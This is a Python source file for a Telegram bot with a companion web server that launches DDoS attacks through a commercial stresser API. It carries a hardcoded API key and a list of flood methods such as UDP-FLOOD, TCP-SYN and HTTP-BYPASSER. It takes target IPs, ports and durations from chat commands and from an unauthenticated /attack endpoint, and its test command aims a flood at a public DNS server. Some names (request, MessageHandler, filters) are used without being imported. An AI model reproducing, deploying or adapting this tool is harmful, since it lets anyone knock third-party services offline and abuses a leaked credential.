import os
import logging
import asyncio
import aiohttp
import json
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from dotenv import load_dotenv
from quart import Quart, jsonify

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))

# FIXED - ALWAYS 2
CONCURRENT = 2
MIN_DURATION = 30
MAX_DURATION = 300

# Attack methods
ATTACK_METHODS = [
    "UDP-FLOOD", "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== QUART APP =====
app = Quart(__name__)

@app.route('/')
async def index():
    return "🤖 GURU Bot - Running"

@app.route('/health')
async def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "concurrent": CONCURRENT,
        "bot_running": True
    })

@app.route('/attack/<target>/<int:port>/<int:duration>')
async def attack_endpoint(target, port, duration):
    """API endpoint to trigger attack"""
    method = request.args.get('method', 'UDP-FLOOD')
    result = await send_attack(target, port, duration, method)
    return jsonify(result)

# ===== ATTACK FUNCTION =====
async def send_attack(target, port, duration, method="UDP-FLOOD"):
    """Send attack with EXACT format that works"""
    
    params = {
        "key": API_KEY,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": method,
        "concs": str(CONCURRENT)
    }
    
    full_url = f"{API_URL}?{'&'.join([f'{k}={v}' for k, v in params.items()])}"
    logger.info(f"🚀 Sending attack: {full_url}")
    logger.info(f"🔄 Concurrent: {CONCURRENT}")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(API_URL, params=params, headers=headers) as response:
                response_text = await response.text()
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text}
                
                logger.info(f"📊 Response: {response.status}")
                
                if response.status == 200:
                    return {
                        "success": True,
                        "status": response.status,
                        "data": response_data,
                        "raw": response_text
                    }
                else:
                    return {
                        "success": False,
                        "status": response.status,
                        "data": response_data,
                        "raw": response_text
                    }
    except Exception as e:
        logger.error(f"❌ Error: {e}")
        return {"success": False, "error": str(e)}

# ===== TELEGRAM BOT =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack_menu")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    
    await update.message.reply_text(
        f"🤖 *GURU BOT*\n\n"
        f"🔄 Concurrent: **{CONCURRENT}** (FIXED)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📡 Default: UDP-FLOOD\n\n"
        f"Usage: `/attack IP PORT TIME`\n"
        f"Example: `/attack 8.8.8.8 43 30`\n"
        f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ Usage: `/attack IP PORT TIME [METHOD]`\n"
            f"Example: `/attack 8.8.8.8 43 30`\n"
            f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`"
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = "UDP-FLOOD"
        if len(args) > 3:
            method = args[3].upper()
            if method not in ATTACK_METHODS:
                method = "UDP-FLOOD"
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        # Send the attack
        status_msg = await update.message.reply_text(
            f"⏳ Sending attack...\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"🔄 Concurrent: **{CONCURRENT}**\n"
            f"📡 Method: `{method}`",
            parse_mode='Markdown'
        )
        
        result = await send_attack(target, port, duration, method)
        
        if result.get('success'):
            attack_id = result.get('data', {}).get('attack_id', 'N/A')
            await status_msg.edit_text(
                f"✅ *ATTACK SENT!*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🔄 Concurrent: **{CONCURRENT}**\n"
                f"📡 Method: `{method}`\n"
                f"🆔 Attack ID: `{attack_id}`\n"
                f"📊 Status: SUCCESS",
                parse_mode='Markdown'
            )
        else:
            error = result.get('error', result.get('raw', 'Unknown error'))
            await status_msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"Error: `{error[:200]}`",
                parse_mode='Markdown'
            )
            
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test the API with the exact URL format"""
    status_msg = await update.message.reply_text("🔍 Testing API with `concs=2`...")
    
    result = await send_attack("8.8.8.8", 53, 30, "UDP-FLOOD")
    
    if result.get('success'):
        await status_msg.edit_text(
            f"✅ *API TEST PASSED*\n\n"
            f"🔄 Concurrent: **{CONCURRENT}**\n"
            f"📊 Status: {result.get('status')}\n"
            f"📋 Response: `{str(result.get('data', {}))[:100]}`",
            parse_mode='Markdown'
        )
    else:
        await status_msg.edit_text(
            f"❌ *API TEST FAILED*\n\n"
            f"Error: `{result.get('error', result.get('raw', 'Unknown'))[:200]}`",
            parse_mode='Markdown'
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"🔄 Concurrent: **{CONCURRENT}**\n"
        f"📡 Default: UDP-FLOOD\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📡 Methods: {len(ATTACK_METHODS)}\n"
        f"🌐 API: {API_URL}",
        parse_mode='Markdown'
    )

# ===== CALLBACK HANDLERS =====
async def attack_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for method in ATTACK_METHODS[:8]:
        keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    await query.edit_message_text(
        f"💥 *SELECT METHOD*\n\n"
        f"Default: UDP-FLOOD\n"
        f"🔄 Concurrent: **{CONCURRENT}**\n\n"
        f"After selecting, send: `IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"📡 *Method: {method}*\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 43 30`\n\n"
        f"🔄 Concurrent: **{CONCURRENT}**\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"📊 *BOT STATUS*\n\n"
        f"🔄 Concurrent: **{CONCURRENT}**\n"
        f"📡 Default: UDP-FLOOD\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📡 Methods: {len(ATTACK_METHODS)}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack_menu")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    
    await query.edit_message_text(
        f"🤖 *GURU BOT*\n\n"
        f"🔄 Concurrent: **{CONCURRENT}** (FIXED)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📡 Default: UDP-FLOOD",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await attack_command(update, context)
        context.user_data['awaiting_attack'] = False

# ===== BOT RUNNER =====
def run_bot():
    """Run bot in a separate thread"""
    if not TELEGRAM_TOKEN:
        logger.error("❌ TELEGRAM_TOKEN not set!")
        return
    
    logger.info("=" * 50)
    logger.info("🔥 GURU BOT - FIXED CONCURRENT=2")
    logger.info(f"🔄 Concurrent: {CONCURRENT} (FIXED)")
    logger.info("=" * 50)
    
    # Create application
    bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Add handlers
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack_command))
    bot_app.add_handler(CommandHandler("test", test_command))
    bot_app.add_handler(CommandHandler("status", status_command))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    
    # Callback handlers
    bot_app.add_handler(CallbackQueryHandler(attack_menu_callback, pattern="^attack_menu$"))
    bot_app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    bot_app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    bot_app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Message handler
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    # Start bot
    logger.info("✅ Bot started! Press Ctrl+C to stop.")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 50)
    print("🔥 GURU BOT - FIXED CONCURRENT=2")
    print(f"🔄 Concurrent: {CONCURRENT} (FIXED)")
    print("=" * 50)
    
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot thread started")
    
    # Run Quart web server
    try:
        app.run(host='0.0.0.0', port=PORT, debug=False)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
    except Exception as e:
        logger.error(f"❌ Web server error: {e}")